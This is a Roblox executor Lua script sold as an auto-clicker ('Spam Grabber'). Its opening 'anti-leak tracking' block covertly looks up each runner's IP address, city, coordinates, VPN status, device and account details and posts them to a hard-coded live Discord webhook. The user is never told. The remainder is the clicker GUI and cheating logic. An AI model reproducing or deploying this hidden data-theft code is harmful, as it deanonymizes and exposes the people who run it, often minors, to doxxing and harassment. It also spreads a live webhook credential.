-- ============================================
-- ANTI-LEAK TRACKING SYSTEM v2.0
-- Auto-identifies script execution
-- ============================================

local Player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera
local MarketplaceService = game:GetService("MarketplaceService")

-- WEBHOOK URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1472640186616647838/LDFNMg2TCfgxqV1L3KhhWG2kLb4vsEqXutnmh23sWMgKVqG1zZJ9GuVRmJbvEH2hceVp"

-- Owner mention
local OWNER_MENTION = "<@1317131074618396676>"

-- Profile URL
local PROFILE_URL = "https://www.roblox.com/users/" .. tostring(Player.UserId) .. "/profile"

-- Enhanced executor detection (PC + Mobile)
local function GetExecutor()
    if identifyexecutor then
        local ok, name, version = pcall(identifyexecutor)
        if ok and name then
            return name .. (version and (" v" .. tostring(version)) or "")
        end
    end
    if getexecutorname then
        local ok, name = pcall(getexecutorname)
        if ok and name then return name end
    end

    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if SENTINEL_LOADED or issentinelclosure then return "Sentinel" end
    if is_sirhurt_closure then return "SirHurt" end
    if Fluxus then return "Fluxus" end
    if ScriptWare then return "Script-Ware" end
    if DrawingLib or draw_circle then return "JJSploit" end

    if getgenv then
        local ok, env = pcall(getgenv)
        if ok and env then
            if env.SOLARA_LOADED then return "Solara" end
            if env.OXYGEN_LOADED then return "Oxygen U" end
            if env.CELERY_LOADED then return "Celery" end
            if env.AWP_LOADED then return "AWP" end
            if env.PROTO_LOADED then return "Proto" end
            if env.VEGA_LOADED then return "Vega X" end
            if env.COCO_Z then return "Coco Z" end
            if env.CALAMARI_LOADED then return "Calamari" end
            if env.EVON_LOADED then return "Evon" end
            if env.VELOCITY_LOADED then return "Velocity" end
            if env.TRIGON_LOADED then return "Trigon Evo" end
            if env.VALYSE_LOADED then return "Valyse" end
            if env.CRYPTIC_LOADED then return "Cryptic" end
            if env.ZORARA_LOADED then return "Zorara" end
            if env.WAVE_LOADED then return "Wave" end
            if env.SW_LOADED then return "Sirus" end
            if env.RONIX_LOADED then return "Ronix" end
            if env.XENO_LOADED then return "Xeno" end
            if env.PHANTOM_LOADED then return "Phantom X" end
            if env.SELIWARE_LOADED then return "Seliware" end
            if env.CODEX_LOADED then return "Codex" end
            if env.HACKRON_LOADED then return "Hackron" end
            if env.FLUXUS_ANDROID then return "Fluxus Android" end
            if env.EVON_MOBILE then return "Evon Mobile" end
            if env.VEGAX_MOBILE then return "Vega X Mobile" end
            if env.DELTA_LOADED then return "Delta" end
            if env.HYDROGEN_LOADED then return "Hydrogen" end
            if env.ARCEUS_LOADED then return "Arceus X" end
            if env.ELECTRON_LOADED then return "Electron" end
            if env.VENUS_LOADED then return "Venus Mobile" end
            if env.TRIGON_ANDROID then return "Trigon Android" end
            if env.DELTA_ANDROID then return "Delta Android" end
            if env.TUBLEX_LOADED then return "Tublex" end
            if env.XHUB_LOADED then return "X-Hub" end
            if env.RANDOMHUB_LOADED then return "RandomHub" end
            if env.NOWGG_LOADED then return "Now.gg Executor" end
            if env.EXECUTOR_LOADED and env.EXECUTOR_NAME then return env.EXECUTOR_NAME end
        end
    end

    if ARCEUS_X or ARCEUSX then return "Arceus X" end
    if delta then return "Delta" end
    if electron then return "Electron" end
    if hydrogen then return "Hydrogen" end
    if CODEX then return "Codex" end
    if SELIWARE then return "Seliware" end
    if KRNL_ANDROID then return "KRNL Android" end
    if FLUXUS_ANDROID then return "Fluxus Android" end
    if VENUS_LOADED then return "Venus Mobile" end
    if TUBLEX then return "Tublex" end
    if XHUB then return "X-Hub" end
    if RANDOMHUB then return "RandomHub" end
    if getgenv and getgenv().solara then return "Solara" end

    if checkcaller and hookfunction and newcclosure then
        return "Unknown (Advanced Executor)"
    elseif checkcaller then
        return "Unknown (Mid Executor)"
    elseif hookfunction then
        return "Unknown (Basic Executor)"
    end

    return "Unknown Executor"
end

local function GetDeviceType()
    local touchEnabled = UserInputService.TouchEnabled
    local mouseEnabled = UserInputService.MouseEnabled
    local keyboardEnabled = UserInputService.KeyboardEnabled
    local gamepadEnabled = UserInputService.GamepadEnabled

    local screenSize = Camera.ViewportSize
    local diagonal = math.sqrt(screenSize.X^2 + screenSize.Y^2)

    if gamepadEnabled and not keyboardEnabled and not mouseEnabled then
        return "Console"
    elseif touchEnabled and not keyboardEnabled and not mouseEnabled then
        return diagonal < 1000 and "Mobile Phone" or "Tablet"
    elseif keyboardEnabled and mouseEnabled then
        return "Computer"
    elseif touchEnabled and keyboardEnabled then
        return "Laptop/2-in-1"
    else
        return "Unknown Device"
    end
end

local function GetLocationAndIP()
    local success, result = pcall(function()
        local response = request({
            Url = "http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,proxy,hosting,query",
            Method = "GET"
        })
        if response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data.status == "success" then
                local isVPN = data.proxy or data.hosting or false
                return {
                    ip = data.query or "Unknown IP",
                    fullLocation = (data.city or "?") .. ", " .. (data.country or "?"),
                    region = data.regionName or "Unknown",
                    lat = data.lat or 0,
                    lon = data.lon or 0,
                    isVPN = isVPN,
                    vpnStatus = isVPN and "⚠️ VPN/Proxy Detected" or "✅ No VPN Detected"
                }
            end
        end
    end)

    if success and result then
        if result.isVPN then
            local bypassSuccess, bypassData = pcall(function()
                local response = request({
                    Url = "https://proxycheck.io/v2/" .. result.ip .. "?vpn=1&asn=1",
                    Method = "GET"
                })
                if response.StatusCode == 200 then
                    local data = HttpService:JSONDecode(response.Body)
                    if data and data[result.ip] then
                        local ipData = data[result.ip]
                        return {
                            vpnType = ipData.type or "Unknown",
                            vpnProvider = ipData.provider or ipData.organisation or "Unknown"
                        }
                    end
                end
            end)
            if bypassSuccess and bypassData then
                result.vpnStatus = "⚠️ VPN: " .. bypassData.vpnType .. " (" .. bypassData.vpnProvider .. ")"
            end
        end
        return result
    end

    return {
        ip = "Unavailable", fullLocation = "Unavailable",
        region = "Unavailable", lat = 0, lon = 0,
        isVPN = false, vpnStatus = "Detection Failed"
    }
end

local function GetAvatarImages()
    local userId = tostring(Player.UserId)
    local headshot = "https://www.roblox.com/images/default_avatar.png"
    local avatar = "https://www.roblox.com/images/default_avatar.png"

    local hsSuccess, hsResult = pcall(function()
        local r = request({ Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png", Method = "GET" })
        if r.StatusCode == 200 then
            local d = HttpService:JSONDecode(r.Body)
            if d and d.data and d.data[1] then return d.data[1].imageUrl end
        end
    end)
    if hsSuccess and hsResult then headshot = hsResult end

    local avSuccess, avResult = pcall(function()
        local r = request({ Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png", Method = "GET" })
        if r.StatusCode == 200 then
            local d = HttpService:JSONDecode(r.Body)
            if d and d.data and d.data[1] then return d.data[1].imageUrl end
        end
    end)
    if avSuccess and avResult then avatar = avResult end

    return headshot, avatar
end

local function GetGameInfo()
    local placeId = game.PlaceId
    local gameName = "Unknown Game"
    local gameLogo = nil
    local gameCreator = "Unknown Creator"

    local infoSuccess, gameInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if infoSuccess and gameInfo then
        gameName = gameInfo.Name or "Unknown Game"
        gameCreator = (gameInfo.Creator and gameInfo.Creator.Name) or "Unknown"
    end

    local uniSuccess, uniResult = pcall(function()
        local r = request({ Url = "https://apis.roblox.com/universes/v1/places/" .. tostring(placeId) .. "/universe", Method = "GET" })
        if r.StatusCode == 200 then
            return HttpService:JSONDecode(r.Body).universeId
        end
    end)

    if uniSuccess and uniResult then
        local logoSuccess, logoResult = pcall(function()
            local r = request({ Url = "https://thumbnails.roblox.com/v1/games/icons?universeIds=" .. tostring(uniResult) .. "&size=512x512&format=Png", Method = "GET" })
            if r.StatusCode == 200 then
                local d = HttpService:JSONDecode(r.Body)
                if d and d.data and d.data[1] then return d.data[1].imageUrl end
            end
        end)
        if logoSuccess and logoResult then gameLogo = logoResult end
    end

    return { name = gameName, creator = gameCreator, placeId = tostring(placeId), logo = gameLogo }
end

local function SendTrackingWebhook()
    spawn(function()
        pcall(function()
            local locationData = GetLocationAndIP()
            local deviceType = GetDeviceType()
            local headshotUrl, avatarUrl = GetAvatarImages()
            local gameInfo = GetGameInfo()
            local executor = GetExecutor()

            local embed = {
                ["title"] = "Script Execution Detected",
                ["url"] = PROFILE_URL,
                ["color"] = locationData.isVPN and 16776960 or 15158332,
                ["fields"] = {
                    { ["name"] = "Username", ["value"] = "[" .. Player.Name .. "](" .. PROFILE_URL .. ")", ["inline"] = true },
                    { ["name"] = "Display Name", ["value"] = Player.DisplayName, ["inline"] = true },
                    { ["name"] = "User ID", ["value"] = tostring(Player.UserId), ["inline"] = true },
                    { ["name"] = "Executor", ["value"] = executor, ["inline"] = true },
                    { ["name"] = "Device Type", ["value"] = deviceType, ["inline"] = true },
                    { ["name"] = "IP Address", ["value"] = "```" .. locationData.ip .. "```", ["inline"] = false },
                    { ["name"] = "VPN Status", ["value"] = locationData.vpnStatus, ["inline"] = false },
                    { ["name"] = "Full Location", ["value"] = locationData.fullLocation, ["inline"] = true },
                    { ["name"] = "Regional Location", ["value"] = locationData.region, ["inline"] = true },
                    { ["name"] = "Coordinates", ["value"] = "Lat: " .. locationData.lat .. ", Lon: " .. locationData.lon, ["inline"] = false },
                    { ["name"] = "Game", ["value"] = "[" .. gameInfo.name .. "](https://www.roblox.com/games/" .. gameInfo.placeId .. ")", ["inline"] = true },
                    { ["name"] = "Game Creator", ["value"] = gameInfo.creator, ["inline"] = true },
                    { ["name"] = "Timestamp", ["value"] = os.date("%Y-%m-%d at %H:%M:%S"), ["inline"] = false }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
                ["thumbnail"] = { ["url"] = headshotUrl },
                ["image"] = { ["url"] = avatarUrl }
            }

            if gameInfo.logo then
                embed["author"] = {
                    ["name"] = gameInfo.name,
                    ["icon_url"] = gameInfo.logo,
                    ["url"] = "https://www.roblox.com/games/" .. gameInfo.placeId
                }
            end

            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    ["content"] = OWNER_MENTION,
                    ["embeds"] = { embed }
                })
            })
        end)
    end)
end

SendTrackingWebhook()

-- ============================================
-- SPAM GRABBER BY CHOSENVESSEL
-- ============================================

local Mouse = Player:GetMouse()
local RunService = game:GetService("RunService")
local VU = game:GetService("VirtualUser")
local TweenService = game:GetService("TweenService")

local ScreenGui = Instance.new("ScreenGui", Player.PlayerGui)
ScreenGui.Name = "SpamGrabberByChosenVessel"
ScreenGui.ResetOnSpawn = false

--- HELPER FUNCTIONS ---

local originalSizes = {}

local function applyGlow(object, color)
    local glow = Instance.new("UIStroke", object)
    glow.Thickness = 2
    glow.Color = color
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    task.spawn(function()
        while glow.Parent do
            local tween = TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Thickness = 4})
            tween:Play()
            break
        end
    end)
end

local function animateClick(button)
    if not originalSizes[button] then
        originalSizes[button] = button.Size
    end

    local baseSize = originalSizes[button]
    local targetSize = UDim2.new(
        baseSize.X.Scale,
        baseSize.X.Offset + 6,
        baseSize.Y.Scale,
        baseSize.Y.Offset + 6
    )

    local clickAnim = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = targetSize})
    local releaseAnim = TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = baseSize})

    clickAnim:Play()
    clickAnim.Completed:Connect(function()
        releaseAnim:Play()
    end)
end

--- SHAKE NOTIFICATION ---

local ShakeNotification = Instance.new("Frame", ScreenGui)
ShakeNotification.Size = UDim2.new(0, 200, 0, 50)
ShakeNotification.Position = UDim2.new(1, -210, 1, 100)
ShakeNotification.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ShakeNotification.BorderSizePixel = 0
ShakeNotification.Visible = false

local NotificationCorner = Instance.new("UICorner", ShakeNotification)
NotificationCorner.CornerRadius = UDim.new(0, 10)

local NotificationStroke = Instance.new("UIStroke", ShakeNotification)
NotificationStroke.Color = Color3.fromRGB(128, 128, 128)
NotificationStroke.Thickness = 2

local NotificationIcon = Instance.new("ImageLabel", ShakeNotification)
NotificationIcon.Size = UDim2.new(0, 35, 0, 35)
NotificationIcon.Position = UDim2.new(0, 8, 0.5, -17.5)
NotificationIcon.BackgroundTransparency = 1
NotificationIcon.Image = "rbxasset://textures/ui/Shell/Icons/ROBUXIcon.png"
NotificationIcon.ImageColor3 = Color3.fromRGB(100, 200, 255)

local NotificationText = Instance.new("TextLabel", ShakeNotification)
NotificationText.Size = UDim2.new(1, -50, 1, 0)
NotificationText.Position = UDim2.new(0, 48, 0, 0)
NotificationText.BackgroundTransparency = 1
NotificationText.Text = "Shake device to\nshow GUI"
NotificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
NotificationText.TextSize = 14
NotificationText.Font = Enum.Font.GothamBold
NotificationText.TextWrapped = true
NotificationText.TextXAlignment = Enum.TextXAlignment.Left
NotificationText.TextYAlignment = Enum.TextYAlignment.Center

local function ShowNotification()
    ShakeNotification.Visible = true
    ShakeNotification.Position = UDim2.new(1, -210, 1, 100)
    ShakeNotification.BackgroundTransparency = 0
    NotificationText.TextTransparency = 0
    NotificationIcon.ImageTransparency = 0
    NotificationStroke.Transparency = 0

    local slideIn = TweenService:Create(
        ShakeNotification,
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Position = UDim2.new(1, -210, 1, -60)}
    )
    slideIn:Play()

    task.delay(1.5, function()
        local fadeOut = TweenService:Create(ShakeNotification, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, -210, 1, 100)})
        local bgFade = TweenService:Create(ShakeNotification, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
        local textFade = TweenService:Create(NotificationText, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {TextTransparency = 1})
        local iconFade = TweenService:Create(NotificationIcon, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {ImageTransparency = 1})
        local strokeFade = TweenService:Create(NotificationStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Transparency = 1})

        fadeOut:Play()
        bgFade:Play()
        textFade:Play()
        iconFade:Play()
        strokeFade:Play()

        fadeOut.Completed:Connect(function()
            ShakeNotification.Visible = false
        end)
    end)
end

--- MAIN UI SETUP ---

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 180, 0, 220)
MainFrame.Position = UDim2.new(0.1, 0, 0.1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.Active = true

local Corner = Instance.new("UICorner", MainFrame)
Corner.CornerRadius = UDim.new(0, 8)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(150, 150, 150)
MainStroke.Thickness = 2
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local TitleBar = Instance.new("TextLabel", MainFrame)
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
TitleBar.Text = "  Spam Grabber by ChosenVessel"
TitleBar.TextColor3 = Color3.new(1, 1, 1)
TitleBar.TextXAlignment = Enum.TextXAlignment.Left
TitleBar.Font = Enum.Font.SourceSansBold
Instance.new("UICorner", TitleBar)

local MinimizeBtn = Instance.new("TextButton", TitleBar)
MinimizeBtn.Size = UDim2.new(0, 28, 0, 24)
MinimizeBtn.Position = UDim2.new(1, -62, 0, 3)
MinimizeBtn.Text = "-"
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MinimizeBtn.TextColor3 = Color3.new(1, 1, 1)
MinimizeBtn.ZIndex = 3
Instance.new("UICorner", MinimizeBtn)

local CloseBtn = Instance.new("TextButton", TitleBar)
CloseBtn.Size = UDim2.new(0, 28, 0, 24)
CloseBtn.Position = UDim2.new(1, -30, 0, 3)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(60, 30, 30)
CloseBtn.TextColor3 = Color3.new(1, 1, 1)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.ZIndex = 3
Instance.new("UICorner", CloseBtn)

local ContentFrame = Instance.new("Frame", MainFrame)
ContentFrame.Size = UDim2.new(1, 0, 1, -30)
ContentFrame.Position = UDim2.new(0, 0, 0, 30)
ContentFrame.BackgroundTransparency = 1

local Layout = Instance.new("UIListLayout", ContentFrame)
Layout.Padding = UDim.new(0, 6)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local ToggleBtn = Instance.new("TextButton", ContentFrame)
ToggleBtn.Size = UDim2.new(0, 150, 0, 35)
ToggleBtn.Text = "Status: OFF"
ToggleBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
ToggleBtn.TextColor3 = Color3.new(1, 1, 1)
ToggleBtn.Font = Enum.Font.SourceSansBold
Instance.new("UICorner", ToggleBtn)

local AddBtn = Instance.new("TextButton", ContentFrame)
AddBtn.Size = UDim2.new(0, 150, 0, 30)
AddBtn.Text = "Add Shortcut +"
AddBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
AddBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", AddBtn)

local RemoveBtn = Instance.new("TextButton", ContentFrame)
RemoveBtn.Size = UDim2.new(0, 150, 0, 30)
RemoveBtn.Text = "Remove Shortcut -"
RemoveBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
RemoveBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", RemoveBtn)

local SpeedInput = Instance.new("TextBox", ContentFrame)
SpeedInput.Size = UDim2.new(0, 150, 0, 30)
SpeedInput.Text = "0.1"
SpeedInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
SpeedInput.TextColor3 = Color3.new(1, 1, 1)
SpeedInput.ClearTextOnFocus = false
Instance.new("UICorner", SpeedInput)

--- SHAKE DETECTION ---

local lastShakeTime = 0
local lastAcceleration = Vector3.new(0, 0, 0)
local shakeThreshold = 15
local shakeCooldown = 1

if UserInputService.AccelerometerEnabled then
    UserInputService.DeviceAccelerationChanged:Connect(function(acceleration)
        if not MainFrame.Visible then
            local currentAccel = acceleration.Position
            local currentTime = tick()
            local accelDelta = (currentAccel - lastAcceleration).Magnitude

            if accelDelta > shakeThreshold and (currentTime - lastShakeTime) > shakeCooldown then
                MainFrame.Visible = true
                lastShakeTime = currentTime
            end

            lastAcceleration = currentAccel
        end
    end)
end

--- LOGIC ---

local clicking = false
local lastValidSpeed = 0.1
local activeShortcut = nil
local shortcutRunning = false

local function makeDraggable(gui, isShortcut)
    local dragging, dragInput, dragStart, startPos, startMousePos
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            startMousePos = input.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    local moveDist = (input.Position - startMousePos).Magnitude
                    if moveDist < 5 and isShortcut then
                        animateClick(gui)
                        shortcutRunning = not shortcutRunning
                        if shortcutRunning then clicking = false end

                        ToggleBtn.Text = clicking and "Status: ON" or "Status: OFF"
                        ToggleBtn.BackgroundColor3 = clicking and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
                        if activeShortcut then
                            activeShortcut.Text = shortcutRunning and "ON" or "OFF"
                            activeShortcut.BackgroundColor3 = shortcutRunning and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
                        end
                    end
                end
            end)
        end
    end)
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
    end)
    RunService.RenderStepped:Connect(function()
        if dragging and dragInput then
            local delta = dragInput.Position - dragStart
            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

makeDraggable(MainFrame, false)

task.spawn(function()
    while true do
        if clicking or shortcutRunning then
            local speed = tonumber(SpeedInput.Text) or lastValidSpeed
            if speed <= 0 then speed = 0.001 end
            local targetPos = Vector2.new(Mouse.X, Mouse.Y)
            VU:CaptureController()
            VU:Button1Down(targetPos)
            VU:Button1Up(targetPos)
            if speed < 0.01 then RunService.Heartbeat:Wait() else task.wait(speed) end
        else
            task.wait(0.1)
        end
    end
end)

ToggleBtn.MouseButton1Click:Connect(function()
    animateClick(ToggleBtn)
    clicking = not clicking
    if clicking then shortcutRunning = false end

    ToggleBtn.Text = clicking and "Status: ON" or "Status: OFF"
    ToggleBtn.BackgroundColor3 = clicking and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
    if activeShortcut then
        activeShortcut.Text = "OFF"
        activeShortcut.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    end
end)

AddBtn.MouseButton1Click:Connect(function()
    animateClick(AddBtn)
    if activeShortcut then return end
    activeShortcut = Instance.new("TextButton", ScreenGui)
    activeShortcut.Size = UDim2.new(0, 38, 0, 38)
    activeShortcut.Position = UDim2.new(0.5, 0, 0.5, 0)
    activeShortcut.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    activeShortcut.Text = "OFF"
    activeShortcut.TextColor3 = Color3.new(1, 1, 1)
    activeShortcut.Font = Enum.Font.SourceSansBold
    activeShortcut.TextSize = 11
    activeShortcut.ZIndex = 10
    Instance.new("UICorner", activeShortcut).CornerRadius = UDim.new(1, 0)
    local shortcutStroke = Instance.new("UIStroke", activeShortcut)
    shortcutStroke.Color = Color3.fromRGB(0, 0, 0)
    shortcutStroke.Thickness = 2
    shortcutStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    makeDraggable(activeShortcut, true)
end)

RemoveBtn.MouseButton1Click:Connect(function()
    animateClick(RemoveBtn)
    if activeShortcut then
        shortcutRunning = false
        activeShortcut:Destroy()
        activeShortcut = nil
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
    ShowNotification()
end)

MinimizeBtn.MouseButton1Click:Connect(function()
    animateClick(MinimizeBtn)
    local isMinimized = ContentFrame.Visible
    ContentFrame.Visible = not isMinimized

    local targetSize = isMinimized and UDim2.new(0, 180, 0, 30) or UDim2.new(0, 180, 0, 220)
    originalSizes[MainFrame] = targetSize

    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = targetSize}):Play()
    MinimizeBtn.Text = isMinimized and "+" or "-"
end)
